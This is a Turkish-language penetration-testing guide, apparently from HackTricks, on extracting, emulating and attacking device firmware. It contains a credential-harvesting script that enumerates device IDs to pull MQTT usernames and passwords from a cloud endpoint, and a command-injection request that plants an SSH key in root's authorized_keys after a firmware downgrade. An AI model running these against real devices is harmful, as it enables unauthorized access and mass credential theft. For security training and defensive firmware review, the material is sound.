# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware, cihazların donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak doğru çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; bu sayede cihaz güç verildiği andan itibaren gerekli talimatlara erişebilir ve işletim sisteminin başlatılmasına yol açar. Firmware incelemesi ve gerekirse değiştirilmesi, güvenlik açıklarını tespit etmede kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik ilk adımdır. Bu süreç şu verilerin toplanmasını içerir:

- Çalıştığı CPU mimarisi ve işletim sistemi
- Bootloader ile ilgili ayrıntılar
- Donanım yerleşimi ve datasheet’ler
- Kod tabanı metrikleri ve kaynak lokasyonları
- Harici kütüphaneler ve lisans tipleri
- Güncelleme geçmişleri ve düzenleyici sertifikalar
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilmiş zafiyetler

Bu amaçla, **open-source intelligence (OSINT)** araçları çok değerlidir; ayrıca mevcut açık kaynaklı yazılım bileşenlerinin elle ve otomatik yöntemlerle incelenmesi fayda sağlar. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz statik analiz sağlar.

## **Firmware Edinme**

Firmware elde etmek çeşitli yollarla yapılabilir; her birinin kendine göre zorluk seviyesi vardır:

- **Doğrudan** kaynaktan (geliştiriciler, üreticiler) almak
- Sağlanan talimatlardan **derleyerek** oluşturmak
- Resmi destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorguları kullanmak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla doğrudan **cloud storage** erişimi
- Güncellemeleri man-in-the-middle teknikleriyle **intercepting**
- Cihazdan **extracting** yapmak için **UART**, **JTAG** veya **PICit** gibi bağlantıları kullanmak
- Cihaz iletişiminde güncelleme isteklerini **sniffing**
- Sert olarak kodlanmış update endpoint’lerini tespit edip kullanmak
- Bootloader veya ağ üzerinden **dumping**
- Tüm yöntemler başarısız olursa, uygun donanım araçlarıyla depolama çipini söküp **reading**

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla çok şey bulamazsanız görüntünün **entropisini** `binwalk -E <bin>` ile kontrol edin; entropi düşükse muhtemelen şifrelenmemiştir. Entropi yüksekse muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, bu araçları firmware içine gömülü **dosyaları çıkarmak için** kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Dosya Sistemini Elde Etme

Önceki bahsedilen araçlarla, örneğin `binwalk -ev <bin>`, **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle bunu **dosya sistemi türüyle aynı isme sahip bir klasörün içinde** çıkarır; genellikle şu türlerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Dosya Sistemi Çıkarma

Bazen binwalk'un imza veritabanında dosya sisteminin magic baytı **olmayabilir**. Bu durumlarda, binwalk'u kullanarak dosya sisteminin **offset'ini bulun ve ikili dosyadan sıkıştırılmış dosya sistemini carve edin** ve aşağıdaki adımları kullanarak dosya sistemini türüne göre **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem carving yapmak için aşağıdaki **dd command**'ı çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra `squashfs-root` dizininde olacaktır.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve muhtemel zafiyetlerini anlamak için onu parçalayıp incelemek önemlidir. Bu süreç, firmware imajından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın (referans olarak `<bin>`) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar, dosya tiplerini tanımlamaya, strings çıkarmaya, ikili veriyi analiz etmeye ve partition ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Şifrenin durumunu değerlendirmek için **entropi**, `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifreleme eksikliğine işaret ederken, yüksek entropi olası şifreleme veya sıkıştırmayı gösterir.

Gömülü **gömülü dosyaları** çıkarmak için araç ve kaynaklar olarak **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** önerilir.

### Dosya Sistemini Çıkarma

Genellikle `binwalk -ev <bin>` kullanılarak dosya sistemi çıkarılabilir; genellikle dosya sistemi türünün adıyla adlandırılmış bir dizine (örn. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'ların eksikliği nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından `dd` komutuyla dosya sistemini carve ederek çıkarmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daha sonra, dosya sistemi türüne bağlı olarak (ör. squashfs, cpio, jffs2, ubifs), içeriği elle çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranır. İnsecure network daemons, hardcoded credentials, API endpointleri, update server fonksiyonları, derlenmemiş kod, startup scriptleri ve çevrimdışı analiz için derlenmiş ikili dosyalara dikkat edilir.

**Key locations** ve **items** incelemek için şunlara bakılmalıdır:

- **etc/shadow** ve **etc/passwd** — kullanıcı kimlik bilgileri için
- SSL sertifikaları ve anahtarlar **etc/ssl** içinde
- Potansiyel zafiyetler için konfigürasyon ve script dosyaları
- Analiz için gömülü ikili dosyalar
- Yaygın IoT device web serverları ve ikili dosyalar

Dosya sistemi içinde hassas bilgileri ve zafiyetleri ortaya çıkarmaya yardımcı olan birkaç araç:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker) hassas bilgi aramaları için
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kapsamlı firmware analizi için
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba) statik ve dinamik analiz için

### Security Checks on Compiled Binaries

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar zafiyetler açısından dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, exploit edilebilecek korunmasız ikili dosyaları belirlemeye yardımcı olur.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Birçok IoT hub, cihaz başına konfigürasyonunu şu şekilde görünen bir cloud endpointinden çeker:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware analizinde, <token>'ın device ID'den ve hardcoded bir secret'tan lokal olarak türetildiğini görebilirsiniz, örneğin:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, deviceId ve STATIC_KEY'i öğrenen herhangi birinin URL'i yeniden oluşturmasına ve cloud konfigürasyonunu çekmesine olanak tanır; bu genellikle düz metin MQTT credentials ve topic prefixlerini açığa çıkarır.

Pratik iş akışı:

1) UART boot loglarından deviceId'yi çıkarın

- 3.3V UART adapter (TX/RX/GND) bağlayın ve logları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Örneğin cloud config URL pattern ve broker address'ini yazdıran satırları arayın:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware'den STATIC_KEY ve token algoritmasını kurtarın

- Binarileri Ghidra/radare2'ye yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'i Bash'te türetin ve digest'i uppercase yapın:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini elde etme

- URL'i oluşturun ve JSON'u curl ile çekin; jq ile ayrıştırarak gizli bilgileri çıkarın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACLs'leri suistimal et (mevcutsa)

- Kurtarılan credentials'leri kullanarak maintenance topics'e subscribe ol ve hassas olayları ara:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (ölçekli, yetkili erişimle)

- Birçok ekosistem, üretici OUI/ürün/tip baytlarını ardışık bir sonekle birlikte gömer.
- Aday ID'leri yineleyip token'lar türetebilir ve config'leri programatik olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration denemeye başlamadan önce her zaman açıkça yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden gizli bilgileri kurtarmak için emulation veya static analysis'i tercih edin.

Firmware emülasyonu süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis** yapılmasını sağlar. Bu yaklaşım donanım veya mimari bağımlılıklarla ilgili zorluklarla karşılaşabilir, ancak root filesystem'i veya belirli ikili dosyaları Raspberry Pi gibi mimari ve endianness'i eşleşen bir cihaza veya önceden hazırlanmış bir virtual machine'e taşımak, ek testleri kolaylaştırabilir.

### Tekil ikili dosyaların emülasyonu

Tek bir programı incelemek için programın endianness'ini ve CPU architecture'ını belirlemek kritik öneme sahiptir.

#### MIPS Architecture ile Örnek

MIPS architecture ikili dosyasını emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

ARM binaries için işlem benzerdir; emülasyon için `qemu-arm` emülatörü kullanılır.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

Bu aşamada analiz için gerçek veya emüle edilmiş bir device environment kullanılır. OS ve filesystem'e shell erişimini korumak esastır. Emulation donanım etkileşimlerini tam olarak taklit etmeyebilir; bu nedenle ara sıra emulation yeniden başlatılması gerekebilir. Analiz filesystem'i yeniden gözden geçirmeli, exposed webpages ve network services'i exploit etmeli ve bootloader zafiyetlerini araştırmalıdır. Firmware integrity testleri, potansiyel backdoor zafiyetlerini tespit etmek için kritiktir.

## Runtime Analysis Techniques

Runtime analysis, bir process veya binary ile operating environment içinde etkileşim kurmayı içerir; breakpoint ayarlamak ve fuzzing gibi tekniklerle zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

## Binary Exploitation and Proof-of-Concept

Tespit edilen zafiyetler için bir PoC geliştirmek, hedef architecture hakkında derin bir anlayış ve düşük seviye dillerde programlama gerektirir. Embedded systems'te binary runtime protections nadirdir; ancak mevcutsa Return Oriented Programming (ROP) gibi teknikler gerekebilir.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing yapmanızı kolaylaştırmak için tasarlanmış bir distro. Gerekli tüm araçların önceden yüklendiği bir pre-configured environment sağlayarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware security testing araçlarıyla preloaded edilmiş embedded security testing işletim sistemi.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Vendor cryptographic signature checks firmware images için uygulansa bile, **version rollback (downgrade) protection sıklıkla atlanır**. Eğer boot- veya recovery-loader yalnızca embedded public key ile signature'ı doğrulayıp flash edilen imajın *version*'ını (veya bir monotonic counter'ı) karşılaştırmıyorsa, attacker geçerli bir signature'a sahip olan **eski, vulnerable bir firmware'i meşru şekilde yükleyebilir** ve böylece yamalanmış zafiyetleri tekrar sisteme sokabilir.

Tipik saldırı iş akışı:

1. **Obtain an older signed image**
* Vendor’ın public download portalından, CDN veya support sitesinden alın.
* Companion mobile/desktop uygulamalarından çıkarın (ör. bir Android APK içinde `assets/firmware/`).
* VirusTotal, Internet archives, forumlar gibi third-party repository'lerden temin edin.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, vb.
* Birçok consumer IoT device *unauthenticated* HTTP(S) endpoint'leri expose eder; bu endpoint'ler Base64-encoded firmware blob'larını kabul eder, server-side decode eder ve recovery/upgrade tetikler.
3. Downgrade'den sonra, daha yeni sürümde patchlenmiş bir zafiyeti exploit edin (örneğin sonradan eklenen bir command-injection filtresi).
4. İsteğe bağlı olarak persistence sağlandıktan sonra detection'ı önlemek için en son image'i geri flash edin veya update'leri disable edin.

### Örnek: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Zafiyetli (downgraded) firmware'de `md5` parametresi herhangi bir sanitizasyon uygulanmadan doğrudan bir shell komutuna ekleniyor; bu, rastgele komut enjeksiyonuna izin veriyor (burada — SSH anahtarlı root erişimini etkinleştiriyor). Daha sonraki firmware sürümleri basit bir karakter filtresi ekledi, ancak downgrade korumasının olmaması bu düzeltmeyi etkisiz kılıyor.

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi‑Fi üzerinden güncelleyebilmesi için yardımcı mobil uygulamalarının içine tam firmware imajlarını paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` gibi araçlar veya basit `unzip` ile imzalı imajları fiziksel donanıma dokunmadan çıkarabilirsiniz.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirme Kontrol Listesi

* *update endpoint*'in iletimi/kimlik doğrulaması yeterince korunuyor mu (TLS + kimlik doğrulama)?
* Cihaz, flashlamadan önce **sürüm numaralarını** yoksa **monotonik anti-rollback sayacını** karşılaştırıyor mu?
* İmaj güvenli bir secure boot zinciri içinde doğrulanıyor mu (ör. imzalar ROM kodu tarafından kontrol ediliyor mu)?
* Kullanıcı alanı kodu ek geçerlilik kontrolleri yapıyor mu (ör. izin verilen partition haritası, model numarası)?
* *partial* veya *backup* güncelleme akışları aynı doğrulama mantığını tekrar mı kullanıyor?

> 💡  Yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmwareler

Firmware'deki zafiyetleri keşfetme pratiği yapmak için aşağıdaki savunmasız firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kaynaklar

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
